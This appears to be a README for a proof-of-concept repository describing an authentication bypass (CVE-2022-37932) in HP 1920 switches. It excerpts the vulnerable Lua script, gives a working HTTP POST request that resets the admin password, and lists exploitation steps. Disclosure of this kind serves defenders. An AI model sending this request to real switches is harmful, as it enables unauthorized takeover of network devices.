# HP Switch Firmware Authentication Bypass Vulnerability

## CVE-2022-37932
 
**Firmware Version: PD.02.21**  
**Affected Devices: HP 1920 Series Smart Managed Switches**

## Overview

This repository documents a critical authentication bypass vulnerability in HP 1920 Series Smart Managed Switches running firmware version PD.02.21. The vulnerability allows an unauthenticated attacker to change the admin password without prior authentication, effectively allowing complete takeover of the device.

## Technical Details

The vulnerability exists in the `/login/default_password_cfg.lua` script, which handles changing the default password for the device. This script:

1. Accepts form POST requests without checking if the user is authenticated
2. Only verifies that the `oldPwd` parameter matches the default password (which is blank/empty)
3. Directly changes the user's password based on POST parameters

### Vulnerable Code

The key vulnerable section in `default_password_cfg.lua`:

```lua
if (request_method == 'POST') then
  -- No authentication or session checks!
  
  local defaultPassword = fpaux.string_const("FD_USER_MGR_DEFAULT_PASSWORD")
  -- ...

  if form_post.oldPwd ~= defaultPassword then
    errorStatus = "401 Unauthorized"
    errorText = label.old_password_mismatch
  else
    -- Proceeds to change password
    -- ...
  end
end
```

The script lacks critical security controls:
- No session validation
- No CSRF protection
- No rate limiting
- Direct access to password change functionality without authentication

## Proof of Concept

An attacker can exploit this vulnerability using a simple HTTP POST request:

```http
POST /login/default_password_cfg.lua HTTP/1.1
Host: [target-ip]
Content-Type: application/x-www-form-urlencoded
Content-Length: [length]

username=admin&oldPwd=&newPwd=[new-password]&confirmPwd=[new-password]
```

Note: The `oldPwd` parameter is left empty as the default password is blank.

## Impact

This vulnerability allows an unauthenticated attacker to:
1. Change the admin password without knowing any credentials
2. Gain complete administrative control over the device
3. Configure the switch, modify network settings, and potentially compromise the entire network

## Exploitation Path

1. Locate a vulnerable HP 1920 Series switch on the network
2. Send the crafted HTTP POST request directly to the device
3. Admin password is changed to attacker-controlled value
4. Attacker can now log in with the new password and full admin privileges

## Credits

Haven't had the time to research who originally discovered this vulnerability I'm just posting a Proof of Concept.

## Legal Disclaimer

This information is provided for educational purposes only. The author is not responsible for any misuse of this information. Always obtain proper authorization before testing for vulnerabilities.
